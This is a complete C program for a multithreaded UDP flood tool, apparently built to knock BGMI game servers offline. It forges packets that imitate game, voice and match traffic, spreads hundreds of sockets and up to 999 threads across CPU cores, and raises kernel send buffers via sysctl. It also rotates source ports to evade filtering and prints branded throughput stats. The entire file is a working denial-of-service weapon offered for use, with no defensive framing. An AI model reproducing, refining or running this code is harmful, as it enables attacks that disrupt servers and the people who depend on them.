#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>
#include <sys/time.h>

#define BUFFER_COUNT 1536
#define FLOOD_SOCKETS 384
#define MIN_PACKET_SIZE 32
#define MAX_PACKET_SIZE 128
#define MIN_THREADS 50
#define MAX_THREADS 999
#define MIN_ATTACK_TIME 5
#define MAX_ATTACK_TIME 300

char *TARGET_IP;
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int global_start_time = 0;

struct sockaddr_in target_addr;

void optimize_kernel() {
#ifdef __linux__
    system("sysctl -w net.core.wmem_max=1073741824 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_default=67108864 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=2000000 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_mem='33554432 33554432 33554432' >/dev/null 2>&1");
#endif
}

void set_sock_buf(int sock) {
    int buf = 33554432;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
}

void create_bgmi_packet(char *buf, int size, int pattern_type, int thread_id, int seq) {
    memset(buf, 0, size);
    
    if (size < 32) size = 32;
    if (size > 128) size = 128;
    
    unsigned int base_seed = (thread_id * 1234567) ^ (seq * 987654321);
    srand(base_seed ^ time(NULL));
    
    switch(pattern_type % 4) {
        case 0: {
            unsigned int magic = 0xDEADBEEF ^ (thread_id * 1111);
            unsigned int session_id = (thread_id * 1000) + (seq % 1000);
            unsigned int timestamp = time(NULL) + thread_id;
            
            memcpy(buf, &magic, 4);
            memcpy(buf + 4, &session_id, 4);
            memcpy(buf + 8, &seq, 4);
            memcpy(buf + 12, &timestamp, 4);
            
            buf[16] = 0xC0;
            buf[17] = thread_id & 0xFF;
            buf[18] = 0x80;
            buf[19] = (seq >> 8) & 0xFF;
            
            for (int i = 20; i < size - 4; i++) {
                buf[i] = rand() & 0xFF;
            }
            
            unsigned short checksum = size ^ thread_id ^ (seq & 0xFFFF);
            memcpy(buf + size - 4, &checksum, 2);
            break;
        }
        case 1: {
            buf[0] = 0xAB;
            buf[1] = 0xCD;
            buf[2] = pattern_type;
            buf[3] = size;
            
            unsigned int player_id = 1000000 + (thread_id * 10000) + seq;
            memcpy(buf + 4, &player_id, 4);
            
            unsigned int game_time = seq % 1800;
            memcpy(buf + 8, &game_time, 4);
            
            buf[12] = 0x01;
            buf[13] = thread_id & 0xFF;
            buf[14] = 0x03;
            buf[15] = (seq >> 16) & 0xFF;
            
            int pos_x = 500 + ((thread_id * 17 + seq) % 4000);
            int pos_y = 500 + ((thread_id * 23 + seq) % 4000);
            int pos_z = 100 + ((thread_id * 29 + seq) % 200);
            
            memcpy(buf + 16, &pos_x, 4);
            memcpy(buf + 20, &pos_y, 4);
            memcpy(buf + 24, &pos_z, 4);
            
            buf[28] = 0x80;
            buf[29] = (seq >> 8) & 0xFF;
            
            int health = 100 - ((thread_id + seq) % 80);
            memcpy(buf + 30, &health, 4);
            
            int ammo = 30 - ((thread_id * 2 + seq) % 25);
            memcpy(buf + 34, &ammo, 4);
            
            for (int i = 38; i < size - 2; i++) {
                buf[i] = rand() & 0xFF;
            }
            
            unsigned short crc = (size * thread_id) ^ seq;
            memcpy(buf + size - 2, &crc, 2);
            break;
        }
        case 2: {
            buf[0] = 0x56;
            buf[1] = 0x4F;
            buf[2] = thread_id & 0xFF;
            buf[3] = 0x43;
            
            unsigned int voice_id = (thread_id * 100000) + seq;
            memcpy(buf + 4, &voice_id, 4);
            
            buf[8] = 0x01;
            buf[9] = pattern_type;
            
            int timestamp = (time(NULL) * 1000) + thread_id + seq;
            memcpy(buf + 10, &timestamp, 4);
            
            buf[14] = 0x7F;
            buf[15] = (seq >> 8) & 0xFF;
            
            for (int i = 16; i < size - 8; i++) {
                buf[i] = (rand() % 256) - 128;
            }
            
            buf[size - 8] = 0xAA ^ (thread_id & 0xFF);
            buf[size - 7] = 0xBB ^ ((thread_id >> 8) & 0xFF);
            buf[size - 6] = 0xCC ^ (seq & 0xFF);
            buf[size - 5] = 0xDD ^ ((seq >> 8) & 0xFF);
            break;
        }
        case 3: {
            buf[0] = 0x4D;
            buf[1] = thread_id & 0xFF;
            buf[2] = 0x54;
            buf[3] = 0x43;
            
            unsigned int match_id = 500000 + (thread_id * 1000) + seq;
            memcpy(buf + 4, &match_id, 4);
            
            buf[8] = (thread_id % 50) + 1;
            buf[9] = pattern_type;
            
            int zone_x = 1000 + ((thread_id * 37 + seq) % 3000);
            int zone_y = 1000 + ((thread_id * 41 + seq) % 3000);
            int zone_radius = 500 + ((thread_id * 43 + seq) % 1500);
            
            memcpy(buf + 10, &zone_x, 4);
            memcpy(buf + 14, &zone_y, 4);
            memcpy(buf + 18, &zone_radius, 4);
            
            buf[22] = 0x01;
            buf[23] = thread_id & 0xFF;
            buf[24] = seq & 0xFF;
            
            int remaining_time = 1200 - ((thread_id * 7 + seq) % 600);
            memcpy(buf + 25, &remaining_time, 4);
            
            for (int i = 29; i < size - 4; i++) {
                buf[i] = rand() & 0xFF;
            }
            
            unsigned int footer = 0x12345678 ^ (thread_id * 1111) ^ seq;
            memcpy(buf + size - 4, &footer, 4);
            break;
        }
    }
}

void *direct_attack(void *arg) {
    int thread_idx = *((int *)arg);
    int socks[FLOOD_SOCKETS];
    int active_sockets = 0;
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) {
            socks[i] = -1;
            continue;
        }
        
        int opt = 1;
        setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        setsockopt(socks[i], SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
        set_sock_buf(socks[i]);
        
        int flg = fcntl(socks[i], F_GETFL, 0);
        if (flg >= 0) fcntl(socks[i], F_SETFL, flg | O_NONBLOCK);
        
        struct sockaddr_in src_addr;
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(1024 + (rand() % 64511));
        src_addr.sin_addr.s_addr = INADDR_ANY;
        
        if (bind(socks[i], (struct sockaddr*)&src_addr, sizeof(src_addr)) == 0) {
            active_sockets++;
        } else {
            close(socks[i]);
            socks[i] = -1;
        }
    }
    
    if (active_sockets == 0) return NULL;
    
    int seq_counter = 0;
    int port_change_counter = 0;
    
    while (!atomic_load(&stop_signal)) {
        int pattern = (seq_counter / 50) % 4;
        
        char *packet = malloc(PACKET_SIZE);
        if (!packet) break;
        
        create_bgmi_packet(packet, PACKET_SIZE, pattern, thread_idx + 1000, seq_counter);
        
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            if (socks[i] < 0) continue;
            
            for (int burst = 0; burst < 25; burst++) {
                int ret = sendto(socks[i], packet, PACKET_SIZE, MSG_DONTWAIT,
                                (struct sockaddr*)&target_addr, sizeof(target_addr));
                
                if (ret > 0) {
                    atomic_fetch_add(&total_packets, 1);
                    atomic_fetch_add(&total_bytes, PACKET_SIZE);
                    seq_counter++;
                }
                
                if (seq_counter % 8 == 0) {
                    usleep(5 + (rand() % 15));
                }
            }
            
            port_change_counter++;
            if (port_change_counter >= 1000) {
                struct sockaddr_in new_src;
                memset(&new_src, 0, sizeof(new_src));
                new_src.sin_family = AF_INET;
                new_src.sin_port = htons(1024 + (rand() % 64511));
                new_src.sin_addr.s_addr = INADDR_ANY;
                bind(socks[i], (struct sockaddr*)&new_src, sizeof(new_src));
                port_change_counter = 0;
            }
        }
        
        free(packet);
        
        if (!atomic_load(&stop_signal)) {
            usleep(150 + (rand() % 200));
        }
    }
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0) close(socks[i]);
    }
    
    return NULL;
}

void *attack_thread(void *arg) {
    int tid = *((int *)arg);
    
#ifdef __linux__
    cpu_set_t cs;
    CPU_ZERO(&cs);
    int c = sysconf(_SC_NPROCESSORS_ONLN);
    if (c > 0) {
        CPU_SET(tid % c, &cs);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cs);
    }
#endif
    
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return NULL;
    
    int o = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &o, sizeof(o));
    setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &o, sizeof(o));
    set_sock_buf(s);
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(1024 + (rand() % 64511));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
        close(s);
        return NULL;
    }
    
    int f = fcntl(s, F_GETFL, 0);
    if (f >= 0) fcntl(s, F_SETFL, f | O_NONBLOCK);
    
    int seq_local = tid * 5000;
    int port_change = 0;
    
    while (!atomic_load(&stop_signal)) {
        int pattern = (seq_local / 75) % 4;
        
        char *packet = malloc(PACKET_SIZE);
        if (!packet) break;
        
        create_bgmi_packet(packet, PACKET_SIZE, pattern, tid, seq_local);
        
        for (int burst = 0; burst < 50; burst++) {
            int ret = sendto(s, packet, PACKET_SIZE, MSG_DONTWAIT,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
            
            if (ret > 0) {
                atomic_fetch_add(&total_packets, 1);
                atomic_fetch_add(&total_bytes, PACKET_SIZE);
                seq_local++;
            }
            
            if (seq_local % 12 == 0) {
                usleep(3 + (rand() % 10));
            }
        }
        
        free(packet);
        
        port_change++;
        if (port_change >= 400) {
            struct sockaddr_in new_src;
            memset(&new_src, 0, sizeof(new_src));
            new_src.sin_family = AF_INET;
            new_src.sin_port = htons(1024 + (rand() % 64511));
            new_src.sin_addr.s_addr = INADDR_ANY;
            bind(s, (struct sockaddr*)&new_src, sizeof(new_src));
            port_change = 0;
        }
        
        if (!atomic_load(&stop_signal)) {
            usleep(80 + (rand() % 120));
        }
    }
    
    close(s);
    return NULL;
}

void *stats_monitor(void *arg) {
    sleep(1);
    
    printf("\n🔥 MR.X FATHER OF TG 🔥\n\n");
    printf("🎯 Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("⏰ Time: %ds | 📦 Packet: %d bytes\n", ATTACK_TIME, PACKET_SIZE);
    printf("👥 Threads: %d\n\n", THREAD_COUNT);
    
    unsigned long long prev_packets = atomic_load(&total_packets);
    unsigned long long prev_bytes = atomic_load(&total_bytes);
    unsigned long long current_peak = 0;
    
    int start_time = atomic_load(&global_start_time);
    int elapsed = 1;
    
    while (elapsed <= ATTACK_TIME && !atomic_load(&stop_signal)) {
        sleep(1);
        
        unsigned long long curr_packets = atomic_load(&total_packets);
        unsigned long long curr_bytes = atomic_load(&total_bytes);
        
        unsigned long long pps = curr_packets - prev_packets;
        unsigned long long bytes_diff = curr_bytes - prev_bytes;
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, pps);
        }
        
        if (pps > current_peak) {
            current_peak = pps;
        }
        
        double megabytes = bytes_diff / (1024.0 * 1024.0);
        printf("🔥  PPS: %lluK | Peak: %lluK | %.1fMB\n", pps/1000, current_peak/1000, megabytes);
        
        prev_packets = curr_packets;
        prev_bytes = curr_bytes;
        elapsed++;
    }
    
    unsigned long long total_p = atomic_load(&total_packets);
    unsigned long long total_b = atomic_load(&total_bytes);
    unsigned long long peak = atomic_load(&peak_pps);
    double avg_pps = total_p / (double)ATTACK_TIME;
    double total_mb = total_b / (1024.0 * 1024.0);
    
    printf("\n🚀 MR.X NEVER END 🚀\n");
    printf("✅ Total Packets: %llu\n", total_p);
    printf("🚀 AVERAGE PPS: %.0fK\n", avg_pps/1000);
    printf("💾 Total Data: %.2fGB\n", total_mb/1024.0);
    
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (ATTACK_TIME < MIN_ATTACK_TIME) ATTACK_TIME = MIN_ATTACK_TIME;
    if (ATTACK_TIME > MAX_ATTACK_TIME) ATTACK_TIME = MAX_ATTACK_TIME;
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Invalid IP address\n");
        return 1;
    }
    
    printf("Target: %s:%d | Time: %ds\n", TARGET_IP, TARGET_PORT, ATTACK_TIME);
    printf("Packet: %d bytes | Threads: %d\n", PACKET_SIZE, THREAD_COUNT);
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec ^ getpid() ^ (time(NULL) << 16));
    
    optimize_kernel();
    
    atomic_store(&global_start_time, time(NULL));
    
    int direct_thread_id = 999999;
    pthread_t direct_thread;
    pthread_create(&direct_thread, NULL, direct_attack, &direct_thread_id);
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !tids) {
        printf("Memory allocation failed\n");
        return 1;
    }
    
    printf("Created %d attack threads\n", THREAD_COUNT);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        pthread_create(&threads[i], NULL, attack_thread, &tids[i]);
    }
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    sleep(ATTACK_TIME);
    
    printf("Stopping attack...\n");
    atomic_store(&stop_signal, 1);
    sleep(2);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(direct_thread, NULL);
    pthread_join(monitor_thread, NULL);
    
    free(threads);
    free(tids);
    
    printf("Cleanup complete\n");
    
    return 0;
}